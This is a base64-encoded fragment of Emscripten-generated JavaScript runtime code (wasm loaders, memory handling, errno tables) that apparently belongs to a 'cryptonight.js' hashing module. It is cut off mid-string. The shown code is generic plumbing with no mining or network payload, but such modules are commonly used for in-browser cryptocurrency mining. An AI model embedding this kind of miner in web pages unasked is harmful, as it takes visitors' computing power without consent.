CiAgICAgICAgfSksICJpMzJzLWRpdiI6IChmdW5jdGlvbih4LCB5KSB7CiAgICAgICAgICAgIHJldHVybiAoeCB8IDApIC8gKHkgfCAwKSB8IDAKICAgICAgICB9KSwgImkzMnUtZGl2IjogKGZ1bmN0aW9uKHgsIHkpIHsKICAgICAgICAgICAgcmV0dXJuICh4ID4+PiAwKSAvICh5ID4+PiAwKSA+Pj4gMAogICAgICAgIH0pLCAiaTMycy1yZW0iOiAoZnVuY3Rpb24oeCwgeSkgewogICAgICAgICAgICByZXR1cm4gKHggfCAwKSAlICh5IHwgMCkgfCAwCiAgICAgICAgfSksICJpMzJ1LXJlbSI6IChmdW5jdGlvbih4LCB5KSB7CiAgICAgICAgICAgIHJldHVybiAoeCA+Pj4gMCkgJSAoeSA+Pj4gMCkgPj4+IDAKICAgICAgICB9KSwgImRlYnVnZ2VyIjogKGZ1bmN0aW9uKCkgewogICAgICAgICAgICBkZWJ1Z2dlcgogICAgICAgIH0pCiAgICB9OwogICAgdmFyIGluZm8gPSB7Imdsb2JhbCI6IG51bGwsICJlbnYiOiBudWxsLCAiYXNtMndhc20iOiBhc20yd2FzbUltcG9ydHMsICJwYXJlbnQiOiBNb2R1bGV9OwogICAgdmFyIGV4cG9ydHMgPSBudWxsOwoKICAgIGZ1bmN0aW9uIGxvb2t1cEltcG9ydChtb2QsIGJhc2UpIHsKICAgICAgICB2YXIgbG9va3VwID0gaW5mbzsKICAgICAgICBpZihtb2QuaW5kZXhPZigiLiIpIDwgMCkgewogICAgICAgICAgICBsb29rdXAgPSAobG9va3VwIHx8IHt9KVttb2RdCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdmFyIHBhcnRzID0gbW9kLnNwbGl0KCIuIik7CiAgICAgICAgICAgIGxvb2t1cCA9IChsb29rdXAgfHwge30pW3BhcnRzWzBdXTsKICAgICAgICAgICAgbG9va3VwID0gKGxvb2t1cCB8fCB7fSlbcGFydHNbMV1dCiAgICAgICAgfQogICAgICAgIGlmKGJhc2UpIHsKICAgICAgICAgICAgbG9va3VwID0gKGxvb2t1cCB8fCB7fSlbYmFzZV0KICAgICAgICB9CiAgICAgICAgaWYobG9va3VwID09PSB1bmRlZmluZWQpIHsKICAgICAgICAgICAgYWJvcnQoImJhZCBsb29rdXBJbXBvcnQgdG8gKCIgKyBtb2QgKyAiKS4iICsgYmFzZSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGxvb2t1cAogICAgfQoKICAgIGZ1bmN0aW9uIG1lcmdlTWVtb3J5KG5ld0J1ZmZlcikgewogICAgICAgIHZhciBvbGRCdWZmZXIgPSBNb2R1bGVbImJ1ZmZlciJdOwogICAgICAgIGlmKG5ld0J1ZmZlci5ieXRlTGVuZ3RoIDwgb2xkQnVmZmVyLmJ5dGVMZW5ndGgpIHsKICAgICAgICAgICAgTW9kdWxlWyJwcmludEVyciJdKCJ0aGUgbmV3IGJ1ZmZlciBpbiBtZXJnZU1lbW9yeSBpcyBzbWFsbGVyIHRoYW4gdGhlIHByZXZpb3VzIG9uZS4gaW4gbmF0aXZlIHdhc20sIHdlIHNob3VsZCBncm93IG1lbW9yeSBoZXJlIikKICAgICAgICB9CiAgICAgICAgdmFyIG9sZFZpZXcgPSBuZXcgSW50OEFycmF5KG9sZEJ1ZmZlcik7CiAgICAgICAgdmFyIG5ld1ZpZXcgPSBuZXcgSW50OEFycmF5KG5ld0J1ZmZlcik7CiAgICAgICAgaWYoIW1lbW9yeUluaXRpYWxpemVyKSB7CiAgICAgICAgICAgIG9sZFZpZXcuc2V0KG5ld1ZpZXcuc3ViYXJyYXkoTW9kdWxlWyJTVEFUSUNfQkFTRSJdLCBNb2R1bGVbIlNUQVRJQ19CQVNFIl0gKyBNb2R1bGVbIlNUQVRJQ19CVU1QIl0pLCBNb2R1bGVbIlNUQVRJQ19CQVNFIl0pCiAgICAgICAgfQogICAgICAgIG5ld1ZpZXcuc2V0KG9sZFZpZXcpOwogICAgICAgIHVwZGF0ZUdsb2JhbEJ1ZmZlcihuZXdCdWZmZXIpOwogICAgICAgIHVwZGF0ZUdsb2JhbEJ1ZmZlclZpZXdzKCkKICAgIH0KCiAgICB2YXIgV2FzbVR5cGVzID0ge25vbmU6IDAsIGkzMjogMSwgaTY0OiAyLCBmMzI6IDMsIGY2NDogNH07CgogICAgZnVuY3Rpb24gZml4SW1wb3J0cyhpbXBvcnRzKSB7CiAgICAgICAgaWYoITApIHJldHVybiBpbXBvcnRzOwogICAgICAgIHZhciByZXQgPSB7fTsKICAgICAgICBmb3IodmFyIGkgaW4gaW1wb3J0cykgewogICAgICAgICAgICB2YXIgZml4ZWQgPSBpOwogICAgICAgICAgICBpZihmaXhlZFswXSA9PSAiXyIpIGZpeGVkID0gZml4ZWQuc3Vic3RyKDEpOwogICAgICAgICAgICByZXRbZml4ZWRdID0gaW1wb3J0c1tpXQogICAgICAgIH0KICAgICAgICByZXR1cm4gcmV0CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0QmluYXJ5KCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBiaW5hcnk7CiAgICAgICAgICAgIGlmKE1vZHVsZVsid2FzbUJpbmFyeSJdKSB7CiAgICAgICAgICAgICAgICBiaW5hcnkgPSBNb2R1bGVbIndhc21CaW5hcnkiXTsKICAgICAgICAgICAgICAgIGJpbmFyeSA9IG5ldyBVaW50OEFycmF5KGJpbmFyeSkKICAgICAgICAgICAgfSBlbHNlIGlmKE1vZHVsZVsicmVhZEJpbmFyeSJdKSB7CiAgICAgICAgICAgICAgICBiaW5hcnkgPSBNb2R1bGVbInJlYWRCaW5hcnkiXSh3YXNtQmluYXJ5RmlsZSkKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHRocm93Im9uIHRoZSB3ZWIsIHdlIG5lZWQgdGhlIHdhc20gYmluYXJ5IHRvIGJlIHByZWxvYWRlZCBhbmQgc2V0IG9uIE1vZHVsZVsnd2FzbUJpbmFyeSddLiBlbWNjLnB5IHdpbGwgZG8gdGhhdCBmb3IgeW91IHdoZW4gZ2VuZXJhdGluZyBIVE1MIChidXQgbm90IEpTKSIKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gYmluYXJ5CiAgICAgICAgfSBjYXRjaChlcnIpIHsKICAgICAgICAgICAgYWJvcnQoZXJyKQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBnZXRCaW5hcnlQcm9taXNlKCkgewogICAgICAgIGlmKCFNb2R1bGVbIndhc21CaW5hcnkiXSAmJiB0eXBlb2YgZmV0Y2ggPT09ICJmdW5jdGlvbiIpIHsKICAgICAgICAgICAgcmV0dXJuIGZldGNoKHdhc21CaW5hcnlGaWxlLCB7Y3JlZGVudGlhbHM6ICJzYW1lLW9yaWdpbiJ9KS50aGVuKChmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgaWYoIXJlc3BvbnNlWyJvayJdKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3ciZmFpbGVkIHRvIGxvYWQgd2FzbSBiaW5hcnkgZmlsZSBhdCAnIiArIHdhc21CaW5hcnlGaWxlICsgIiciCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2VbImFycmF5QnVmZmVyIl0oKQogICAgICAgICAgICB9KSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChmdW5jdGlvbihyZXNvbHZlLCByZWplY3QpIHsKICAgICAgICAgICAgcmVzb2x2ZShnZXRCaW5hcnkoKSkKICAgICAgICB9KSkKICAgIH0KCiAgICBmdW5jdGlvbiBkb05hdGl2ZVdhc20oZ2xvYmFsLCBlbnYsIHByb3ZpZGVkQnVmZmVyKSB7CiAgICAgICAgaWYodHlwZW9mIFdlYkFzc2VtYmx5ICE9PSAib2JqZWN0IikgewogICAgICAgICAgICBNb2R1bGVbInByaW50RXJyIl0oIm5vIG5hdGl2ZSB3YXNtIHN1cHBvcnQgZGV0ZWN0ZWQiKTsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgfQogICAgICAgIGlmKCEoTW9kdWxlWyJ3YXNtTWVtb3J5Il0gaW5zdGFuY2VvZiBXZWJBc3NlbWJseS5NZW1vcnkpKSB7CiAgICAgICAgICAgIE1vZHVsZVsicHJpbnRFcnIiXSgibm8gbmF0aXZlIHdhc20gTWVtb3J5IGluIHVzZSIpOwogICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICB9CiAgICAgICAgZW52WyJtZW1vcnkiXSA9IE1vZHVsZVsid2FzbU1lbW9yeSJdOwogICAgICAgIGluZm9bImdsb2JhbCJdID0geyJOYU4iOiBOYU4sICJJbmZpbml0eSI6IEluZmluaXR5fTsKICAgICAgICBpbmZvWyJnbG9iYWwuTWF0aCJdID0gZ2xvYmFsLk1hdGg7CiAgICAgICAgaW5mb1siZW52Il0gPSBlbnY7CgogICAgICAgIGZ1bmN0aW9uIHJlY2VpdmVJbnN0YW5jZShpbnN0YW5jZSkgewogICAgICAgICAgICBleHBvcnRzID0gaW5zdGFuY2UuZXhwb3J0czsKICAgICAgICAgICAgaWYoZXhwb3J0cy5tZW1vcnkpIG1lcmdlTWVtb3J5KGV4cG9ydHMubWVtb3J5KTsKICAgICAgICAgICAgTW9kdWxlWyJhc20iXSA9IGV4cG9ydHM7CiAgICAgICAgICAgIE1vZHVsZVsidXNpbmdXYXNtIl0gPSB0cnVlOwogICAgICAgICAgICByZW1vdmVSdW5EZXBlbmRlbmN5KCJ3YXNtLWluc3RhbnRpYXRlIikKICAgICAgICB9CgogICAgICAgIGFkZFJ1bkRlcGVuZGVuY3koIndhc20taW5zdGFudGlhdGUiKTsKICAgICAgICBpZihNb2R1bGVbImluc3RhbnRpYXRlV2FzbSJdKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICByZXR1cm4gTW9kdWxlWyJpbnN0YW50aWF0ZVdhc20iXShpbmZvLCByZWNlaXZlSW5zdGFuY2UpCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgTW9kdWxlWyJwcmludEVyciJdKCJNb2R1bGUuaW5zdGFudGlhdGVXYXNtIGNhbGxiYWNrIGZhaWxlZCB3aXRoIGVycm9yOiAiICsgZSk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBnZXRCaW5hcnlQcm9taXNlKCkudGhlbigoZnVuY3Rpb24oYmluYXJ5KSB7CiAgICAgICAgICAgIHJldHVybiBXZWJBc3NlbWJseS5pbnN0YW50aWF0ZShiaW5hcnksIGluZm8pCiAgICAgICAgfSkpLnRoZW4oKGZ1bmN0aW9uKG91dHB1dCkgewogICAgICAgICAgICByZWNlaXZlSW5zdGFuY2Uob3V0cHV0WyJpbnN0YW5jZSJdKQogICAgICAgIH0pKS5jYXRjaCgoZnVuY3Rpb24ocmVhc29uKSB7CiAgICAgICAgICAgIE1vZHVsZVsicHJpbnRFcnIiXSgiZmFpbGVkIHRvIGFzeW5jaHJvbm91c2x5IHByZXBhcmUgd2FzbTogIiArIHJlYXNvbik7CiAgICAgICAgICAgIGFib3J0KHJlYXNvbikKICAgICAgICB9KSk7CiAgICAgICAgcmV0dXJuIHt9CiAgICB9CgogICAgTW9kdWxlWyJhc21QcmVsb2FkIl0gPSBNb2R1bGVbImFzbSJdOwogICAgdmFyIGFzbWpzUmVhbGxvY0J1ZmZlciA9IE1vZHVsZVsicmVhbGxvY0J1ZmZlciJdOwogICAgdmFyIHdhc21SZWFsbG9jQnVmZmVyID0gKGZ1bmN0aW9uKHNpemUpIHsKICAgICAgICB2YXIgUEFHRV9NVUxUSVBMRSA9IE1vZHVsZVsidXNpbmdXYXNtIl0gPyBXQVNNX1BBR0VfU0laRSA6IEFTTUpTX1BBR0VfU0laRTsKICAgICAgICBzaXplID0gYWxpZ25VcChzaXplLCBQQUdFX01VTFRJUExFKTsKICAgICAgICB2YXIgb2xkID0gTW9kdWxlWyJidWZmZXIiXTsKICAgICAgICB2YXIgb2xkU2l6ZSA9IG9sZC5ieXRlTGVuZ3RoOwogICAgICAgIGlmKE1vZHVsZVsidXNpbmdXYXNtIl0pIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHZhciByZXN1bHQgPSBNb2R1bGVbIndhc21NZW1vcnkiXS5ncm93KChzaXplIC0gb2xkU2l6ZSkgLyB3YXNtUGFnZVNpemUpOwogICAgICAgICAgICAgICAgaWYocmVzdWx0ICE9PSAoLTEgfCAwKSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBNb2R1bGVbImJ1ZmZlciJdID0gTW9kdWxlWyJ3YXNtTWVtb3J5Il0uYnVmZmVyCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgcmV0dXJuIG51bGwKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGV4cG9ydHNbIl9fZ3Jvd1dhc21NZW1vcnkiXSgoc2l6ZSAtIG9sZFNpemUpIC8gd2FzbVBhZ2VTaXplKTsKICAgICAgICAgICAgcmV0dXJuIE1vZHVsZVsiYnVmZmVyIl0gIT09IG9sZCA/IE1vZHVsZVsiYnVmZmVyIl0gOiBudWxsCiAgICAgICAgfQogICAgfSk7CiAgICBNb2R1bGVbInJlYWxsb2NCdWZmZXIiXSA9IChmdW5jdGlvbihzaXplKSB7CiAgICAgICAgaWYoZmluYWxNZXRob2QgPT09ICJhc21qcyIpIHsKICAgICAgICAgICAgcmV0dXJuIGFzbWpzUmVhbGxvY0J1ZmZlcihzaXplKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiB3YXNtUmVhbGxvY0J1ZmZlcihzaXplKQogICAgICAgIH0KICAgIH0pOwogICAgdmFyIGZpbmFsTWV0aG9kID0gIiI7CiAgICBNb2R1bGVbImFzbSJdID0gKGZ1bmN0aW9uKGdsb2JhbCwgZW52LCBwcm92aWRlZEJ1ZmZlcikgewogICAgICAgIGdsb2JhbCA9IGZpeEltcG9ydHMoZ2xvYmFsKTsKICAgICAgICBlbnYgPSBmaXhJbXBvcnRzKGVudik7CiAgICAgICAgaWYoIWVudlsidGFibGUiXSkgewogICAgICAgICAgICB2YXIgVEFCTEVfU0laRSA9IE1vZHVsZVsid2FzbVRhYmxlU2l6ZSJdOwogICAgICAgICAgICBpZihUQUJMRV9TSVpFID09PSB1bmRlZmluZWQpIFRBQkxFX1NJWkUgPSAxMDI0OwogICAgICAgICAgICB2YXIgTUFYX1RBQkxFX1NJWkUgPSBNb2R1bGVbIndhc21NYXhUYWJsZVNpemUiXTsKICAgICAgICAgICAgaWYodHlwZW9mIFdlYkFzc2VtYmx5ID09PSAib2JqZWN0IiAmJiB0eXBlb2YgV2ViQXNzZW1ibHkuVGFibGUgPT09ICJmdW5jdGlvbiIpIHsKICAgICAgICAgICAgICAgIGlmKE1BWF9UQUJMRV9TSVpFICE9PSB1bmRlZmluZWQpIHsKICAgICAgICAgICAgICAgICAgICBlbnZbInRhYmxlIl0gPSBuZXcgV2ViQXNzZW1ibHkuVGFibGUoewogICAgICAgICAgICAgICAgICAgICAgICAiaW5pdGlhbCI6IFRBQkxFX1NJWkUsCiAgICAgICAgICAgICAgICAgICAgICAgICJtYXhpbXVtIjogTUFYX1RBQkxFX1NJWkUsCiAgICAgICAgICAgICAgICAgICAgICAgICJlbGVtZW50IjogImFueWZ1bmMiCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgZW52WyJ0YWJsZSJdID0gbmV3IFdlYkFzc2VtYmx5LlRhYmxlKHsiaW5pdGlhbCI6IFRBQkxFX1NJWkUsIGVsZW1lbnQ6ICJhbnlmdW5jIn0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlbnZbInRhYmxlIl0gPSBuZXcgQXJyYXkoVEFCTEVfU0laRSkKICAgICAgICAgICAgfQogICAgICAgICAgICBNb2R1bGVbIndhc21UYWJsZSJdID0gZW52WyJ0YWJsZSJdCiAgICAgICAgfQogICAgICAgIGlmKCFlbnZbIm1lbW9yeUJhc2UiXSkgewogICAgICAgICAgICBlbnZbIm1lbW9yeUJhc2UiXSA9IE1vZHVsZVsiU1RBVElDX0JBU0UiXQogICAgICAgIH0KICAgICAgICBpZighZW52WyJ0YWJsZUJhc2UiXSkgewogICAgICAgICAgICBlbnZbInRhYmxlQmFzZSJdID0gMAogICAgICAgIH0KICAgICAgICB2YXIgZXhwb3J0czsKICAgICAgICBleHBvcnRzID0gZG9OYXRpdmVXYXNtKGdsb2JhbCwgZW52LCBwcm92aWRlZEJ1ZmZlcik7CiAgICAgICAgcmV0dXJuIGV4cG9ydHMKICAgIH0pOwogICAgdmFyIG1ldGhvZEhhbmRsZXIgPSBNb2R1bGVbImFzbSJdCn0KCmludGVncmF0ZVdhc21KUyhNb2R1bGUpOwp2YXIgQVNNX0NPTlNUUyA9IFtdOwpTVEFUSUNfQkFTRSA9IFJ1bnRpbWUuR0xPQkFMX0JBU0U7ClNUQVRJQ1RPUCA9IFNUQVRJQ19CQVNFICsgMTI1MTI7Cl9fQVRJTklUX18ucHVzaCgpOwptZW1vcnlJbml0aWFsaXplciA9IE1vZHVsZVsid2FzbUpTTWV0aG9kIl0uaW5kZXhPZigiYXNtanMiKSA+PSAwIHx8IE1vZHVsZVsid2FzbUpTTWV0aG9kIl0uaW5kZXhPZigiaW50ZXJwcmV0LWFzbTJ3YXNtIikgPj0gMCA/ICJjcnlwdG9uaWdodC5qcy5tZW0iIDogbnVsbDsKdmFyIFNUQVRJQ19CVU1QID0gMTI1MTI7Ck1vZHVsZVsiU1RBVElDX0JBU0UiXSA9IFNUQVRJQ19CQVNFOwpNb2R1bGVbIlNUQVRJQ19CVU1QIl0gPSBTVEFUSUNfQlVNUDsKdmFyIHRlbXBEb3VibGVQdHIgPSBTVEFUSUNUT1A7ClNUQVRJQ1RPUCArPSAxNjsKCmZ1bmN0aW9uIF9fX2Fzc2VydF9mYWlsKGNvbmRpdGlvbiwgZmlsZW5hbWUsIGxpbmUsIGZ1bmMpIHsKICAgIEFCT1JUID0gdHJ1ZTsKICAgIHRocm93IkFzc2VydGlvbiBmYWlsZWQ6ICIgKyBQb2ludGVyX3N0cmluZ2lmeShjb25kaXRpb24pICsgIiwgYXQ6ICIgKyBbZmlsZW5hbWUgPyBQb2ludGVyX3N0cmluZ2lmeShmaWxlbmFtZSkgOiAidW5rbm93biBmaWxlbmFtZSIsIGxpbmUsIGZ1bmMgPyBQb2ludGVyX3N0cmluZ2lmeShmdW5jKSA6ICJ1bmtub3duIGZ1bmN0aW9uIl0gKyAiIGF0ICIgKyBzdGFja1RyYWNlKCkKfQoKdmFyIFBST0NJTkZPID0ge3BwaWQ6IDEsIHBpZDogNDIsIHNpZDogNDIsIHBnaWQ6IDQyfTsKdmFyIEVSUk5PX0NPREVTID0gewogICAgRVBFUk06IDEsCiAgICBFTk9FTlQ6IDIsCiAgICBFU1JDSDogMywKICAgIEVJTlRSOiA0LAogICAgRUlPOiA1LAogICAgRU5YSU86IDYsCiAgICBFMkJJRzogNywKICAgIEVOT0VYRUM6IDgsCiAgICBFQkFERjogOSwKICAgIEVDSElMRDogMTAsCiAgICBFQUdBSU46IDExLAogICAgRVdPVUxEQkxPQ0s6IDExLAogICAgRU5PTUVNOiAxMiwKICAgIEVBQ0NFUzogMTMsCiAgICBFRkFVTFQ6IDE0LAogICAgRU5PVEJMSzogMTUsCiAgICBFQlVTWTogMTYsCiAgICBFRVhJU1Q6IDE3LAogICAgRVhERVY6IDE4LAogICAgRU5PREVWOiAxOSwKICAgIEVOT1RESVI6IDIwLAogICAgRUlTRElSOiAyMSwKICAgIEVJTlZBTDogMjIsCiAgICBFTkZJTEU6IDIzLAogICAgRU1GSUxFOiAyNCwKICAgIEVOT1RUWTogMjUsCiAgICBFVFhUQlNZOiAyNiwKICAgIEVGQklHOiAyNywKICAgIEVOT1NQQzogMjgsCiAgICBFU1BJUEU6IDI5LAogICAgRVJPRlM6IDMwLAogICAgRU1MSU5LOiAzMSwKICAgIEVQSVBFOiAzMiwKICAgIEVET006IDMzLAogICAgRVJBTkdFOiAzNCwKICAgIEVOT01TRzogNDIsCiAgICBFSURSTTogNDMsCiAgICBFQ0hSTkc6IDQ0LAogICAgRUwyTlNZTkM6IDQ1LAogICAgRUwzSExUOiA0NiwKICAgIEVMM1JTVDogNDcsCiAgICBFTE5STkc6IDQ4LAogICAgRVVOQVRDSDogNDksCiAgICBFTk9DU0k6IDUwLAogICAgRUwySExUOiA1MSwKICAgIEVERUFETEs6IDM1LAogICAgRU5PTENLOiAzNywKICAgIEVCQURFOiA1MiwKICAgIEVCQURSOiA1MywKICAgIEVYRlVMTDogNTQsCiAgICBFTk9BTk86IDU1LAogICAgRUJBRFJRQzogNTYsCiAgICBFQkFEU0xUOiA1NywKICAgIEVERUFETE9DSzogMzUsCiAgICBFQkZPTlQ6IDU5LAogICAgRU5PU1RSOiA2MCwKICAgIEVOT0RBVEE6IDYxLAogICAgRVRJTUU6IDYyLAogICAgRU5PU1I6IDYzLAogICAgRU5PTkVUOiA2NCwKICAgIEVOT1BLRzogNjUsCiAgICBFUkVNT1RFOiA2NiwKICAgIEVOT0xJTks6IDY3LAogICAgRUFEVjogNjgsCiAgICBFU1JNTlQ6IDY5LAogICAgRUNPTU06IDcwLAogICAgRVBST1RPOiA3MSwKICAgIEVNVUxUSUhPUDogNzIsCiAgICBFRE9URE9UOiA3MywKICAgIEVCQURNU0c6IDc0LAogICAgRU5PVFVOSVE6IDc2LAogICAgRUJBREZEOiA3NywKICAgIEVSRU1DSEc6IDc4LAogICAgRUxJQkFDQzogNzksCiAgICBFTElCQkFEOiA4MCwKICAgIEVMSUJTQ046IDgxLAogICAgRUxJQk1BWDogODIsCiAgICBFTElCRVhFQzogODMsCiAgICBFTk9TWVM6IDM4LAogICAgRU5PVEVNUFRZOiAzOSwKICAgIEVOQU1FVE9PTE9ORzogMzYsCiAgICBFTE9PUDogNDAsCiAgICBFT1BOT1RTVVBQOiA5NSwKICAgIEVQRk5PU1VQUE9SVDogOTYsCiAgICBFQ09OTlJFU0VUOiAxMDQsCiAgICBFTk9CVUZTOiAxMDUsCiAgICBFQUZOT1NVUFBPUlQ6IDk3LAogICAgRVBST1RPVFlQRTogOTEsCiAgICBFTk9UU09DSzogODgsCiAgICBFTk9QUk9UT09QVDogOTIsCiAgICBFU0hVVERPV046IDEwOCwKICAgIEVDT05OUkVGVVNFRDogMTExLAogICAgRUFERFJJTlVTRTogOTgsCiAgICBFQ09OTkFCT1JURUQ6IDEwMywKICAgIEVORVRVTlJFQUNIOiAxMDEsCiAgICBFTkVURE9XTjogMTAwLAogICAgRVRJTUVET1VUOiAxMTAsCiAgICBFSE9TVERPV046IDExMiwKICAgIEVIT1NUVU5SRUFDSDogMTEzLAogICAgRUlOUFJPR1JFU1M6IDExNSwKICAgIEVBTFJFQURZOiAxMTQsCiAgICBFREVTVEFERFJSRVE6IDg5LAogICAgRU1TR1NJWkU6IDkwLAogICAgRVBST1RPTk9TVVBQT1JUOiA5MywKICAgIEVTT0NLVE5PU1VQUE9SVDogOTQsCiAgICBFQUREUk5PVEFWQUlMOiA5OSwKICAgIEVORVRSRVNFVDogMTAyLAogICAgRUlTQ09OTjogMTA2LAogICAgRU5PVENPTk46IDEwNywKICAgIEVUT09NQU5ZUkVGUzogMTA5LAogICAgRVVTRVJTOiA4NywKICAgIEVEUVVPVDogMTIyLAogICAgRVNUQUxFOiAxMTYsCiAgICBFTk9UU1VQOiA5NSwKICAgIEVOT01FRElVTTogMTIzLAogICAgRUlMU0VROiA4NCwKICAgIEVPVkVSRkxPVzogNzUsCiAgICBFQ0FOQ0VMRUQ6IDEyNSwKICAgIEVOT1RSRUNPVkVSQUJMRTogMTMxLAogICAgRU9XTkVSREVBRDogMTMwLAogICAgRVNUUlBJUEU6IDg2Cn07CnZhciBFUlJOT19NRVNTQUdFUyA9IHsKICAgIDA6ICJTdWNjZXNzIiwKICAgIDE6ICJOb3Qgc3VwZXItdXNlciIsCiAgICAyOiAiTm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeSIsCiAgICAzOiAiTm8gc3VjaCBwcm9jZXNzIiwKICAgIDQ6ICJJbnRlcnJ1cHRlZCBzeXN0ZW0gY2FsbCIsCiAgICA1OiAiSS9PIGVycm9yIiwKICAgIDY6ICJObyBzdWNoIGRldmljZSBvciBhZGRyZXNzIiwKICAgIDc6ICJBcmcgbGlzdCB0b28gbG9uZyIsCiAgICA4OiAiRXhlYyBmb3JtYXQgZXJyb3IiLAogICAgOTogIkJhZCBmaWxlIG51bWJlciIsCiAgICAxMDogIk5vIGNoaWxkcmVuIiwKICAgIDExOiAiTm8gbW9yZSBwcm9jZXNzZXMiLAogICAgMTI6ICJOb3QgZW5vdWdoIGNvcmUiLAogICAgMTM6ICJQZXJtaXNzaW9uIGRlbmllZCIsCiAgICAxNDogIkJhZCBhZGRyZXNzIiwKICAgIDE1OiAiQmxvY2sgZGV2aWNlIHJlcXVpcmVkIiwKICAgIDE2OiAiTW91bnQgZGV2aWNlIGJ1c3kiLAogICAgMTc6ICJGaWxlIGV4aXN0cyIsCiAgICAxODogIkNyb3NzLWRldmljZSBsaW5rIiwKICAgIDE5OiAiTm8gc3VjaCBkZXZpY2UiLAogICAgMjA6ICJOb3QgYSBkaXJlY3RvcnkiLAogICAgMjE6ICJJcyBhIGRpcmVjdG9yeSIsCiAgICAyMjogIkludmFsaWQgYXJndW1lbnQiLAogICAgMjM6ICJUb28gbWFueSBvcGVuIGZpbGVzIGluIHN5c3RlbSIsCiAgICAyNDogIlRvbyBtYW55IG9wZW4gZmlsZXMiLAogICAgMjU6ICJOb3QgYSB0eXBld3JpdGVyIiwKICAgIDI2OiAiVGV4dCBmaWxlIGJ1c3kiLAogICAgMjc6ICJGaWxlIHRvbyBsYXJnZSIsCiAgICAyODogIk5vIHNwYWNlIGxlZnQgb24gZGV2aWNlIiwKICAgIDI5OiAiSWxsZWdhbCBzZWVrIiwKICAgIDMwOiAiUmVhZCBvbmx5IGZpbGUgc3lzdGVtIiwKICAgIDMxOiAiVG9vIG1hbnkgbGlua3MiLAogICAgMzI6ICJCcm9rZW4gcGlwZSIsCiAgICAzMzogIk1hdGggYXJnIG91dCBvZiBkb21haW4gb2YgZnVuYyIsCiAgICAzNDogIk1hdGggcmVzdWx0IG5vdCByZXByZXNlbnRhYmxlIiwKICAgIDM1OiAiRmlsZSBsb2NraW5nIGRlYWRsb2NrIGVycm9yIiwKICAgIDM2OiAiRmlsZSBvciBwYXRoIG5hbWUgdG9vIGxvbmciLAogICAgMzc6ICJObyByZWNvcmQgbG9ja3MgYXZhaWxhYmxlIiwKICAgIDM4OiAiRnVuY3Rpb24gbm90IGltcGxlbWVudGVkIiwKICAgIDM5OiAiRGlyZWN0b3J5IG5vdCBlbXB0eSIsCiAgICA0MDogIlRvbyBtYW55IHN5bWJvbGljIGxpbmtzIiwKICAgIDQyOiAiTm8gbWVzc2FnZSBvZiBkZXNpcmVkIHR5cGUiLAogICAgNDM6ICJJZGVudGlmaWVyIHJlbW92ZWQiLAogICAgNDQ6ICJDaGFubmVsIG51bWJlciBvdXQgb2YgcmFuZ2UiLAogICAgNDU6ICJMZXZlbCAyIG5vdCBzeW5jaHJvbml6ZWQiLAogICAgNDY6ICJMZXZlbCAzIGhhbHRlZCIsCiAgICA0NzogIkxldmVsIDMgcmVzZXQiLAogICAgNDg6ICJMaW5rIG51bWJlciBvdXQgb2YgcmFuZ2UiLAogICAgNDk6ICJQcm90b2NvbCBkcml2ZXIgbm90IGF0dGFjaGVkIiwKICAgIDUwOiAiTm8gQ1NJIHN0cnVjdHVyZSBhdmFpbGFibGUiLAogICAgNTE6ICJMZXZlbCAyIGhhbHRlZCIsCiAgICA1MjogIkludmFsaWQgZXhjaGFuZ2UiLAogICAgNTM6ICJJbnZhbGlkIHJlcXVlc3QgZGVzY3JpcHRvciIsCiAgICA1NDogIkV4Y2hhbmdlIGZ1bGwiLAogICAgNTU6ICJObyBhbm9kZSIsCiAgICA1NjogIkludmFsaWQgcmVxdWVzdCBjb2RlIiwKICAgIDU3OiAiSW52YWxpZCBzbG90IiwKICAgIDU5OiAiQmFkIGZvbnQgZmlsZSBmbXQiLAogICAgNjA6ICJEZXZpY2Ugbm90IGEgc3RyZWFtIiwKICAgIDYxOiAiTm8gZGF0YSAoZm9yIG5vIGRlbGF5IGlvKSIsCiAgICA2MjogIlRpbWVyIGV4cGlyZWQiLAogICAgNjM6ICJPdXQgb2Ygc3RyZWFtcyByZXNvdXJjZXMiLAogICAgNjQ6ICJNYWNoaW5lIGlzIG5vdCBvbiB0aGUgbmV0d29yayIsCiAgICA2NTogIlBhY2thZ2Ugbm90IGluc3RhbGxlZCIsCiAgICA2NjogIlRoZSBvYmplY3QgaXMgcmVtb3RlIiwKICAgIDY3OiAiVGhlIGxpbmsgaGFzIGJlZW4gc2V2ZXJlZCIsCiAgICA2ODogIkFkdmVydGlzZSBlcnJvciIsCiAgICA2OTogIlNybW91bnQgZXJyb3IiLAogICAgNzA6ICJDb21tdW5pY2F0aW9uIGVycm9yIG9uIHNlbmQiLAogICAgNzE6ICJ